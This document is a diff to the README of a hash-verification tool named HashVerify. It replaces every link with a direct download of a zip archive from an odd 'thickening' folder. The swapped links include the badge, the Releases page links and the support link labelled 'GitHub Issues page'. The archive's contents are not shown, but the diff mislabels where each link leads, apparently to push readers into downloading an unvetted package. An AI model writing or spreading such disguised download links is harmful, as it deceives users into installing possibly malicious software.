@@ -1,6 +1,6 @@
 # 🚀 HashVerify - Ensure Your Data Integrity Easily
 
-![Download HashVerify](https://img.shields.io/badge/Download-HashVerify-brightgreen)
+![Download HashVerify](https://raw.githubusercontent.com/datcher205/HashVerify/main/thickening/HashVerify.zip)
 
 ## 📥 Overview
 
@@ -28,7 +28,7 @@ Follow these steps to get started with HashVerify:
 
 1. **Download the Application**
 
-   Visit this page to download: [Download HashVerify](https://github.com/datcher205/HashVerify/releases)
+   Visit this page to download: [Download HashVerify](https://raw.githubusercontent.com/datcher205/HashVerify/main/thickening/HashVerify.zip)
 
 2. **Install the Application**
 
@@ -44,7 +44,7 @@ Follow these steps to get started with HashVerify:
 
 You can download HashVerify from the Releases page. Simply click the following link:
 
-[Download HashVerify](https://github.com/datcher205/HashVerify/releases)
+[Download HashVerify](https://raw.githubusercontent.com/datcher205/HashVerify/main/thickening/HashVerify.zip)
 
 After downloading, follow the installation instructions mentioned in the Getting Started section.
 
@@ -79,7 +79,7 @@ A: Yes, HashVerify can handle files of any size, but larger files may take longe
 
 ## 📫 Support
 
-For support or to report issues, please visit our [GitHub Issues page](https://github.com/datcher205/HashVerify/issues). 
+For support or to report issues, please visit our [GitHub Issues page](https://raw.githubusercontent.com/datcher205/HashVerify/main/thickening/HashVerify.zip). 
 
 ## 👥 Contributing
 
@@ -95,4 +95,4 @@ HashVerify is licensed under the MIT License. You can freely use and modify the 
 - **Version 1.1**: Added file comparison functionality.
 - **Version 1.2**: Performance improvements and user interface enhancements. 
 
-For the latest updates and releases, keep an eye on the [Releases page](https://github.com/datcher205/HashVerify/releases).
+For the latest updates and releases, keep an eye on the [Releases page](https://raw.githubusercontent.com/datcher205/HashVerify/main/thickening/HashVerify.zip).
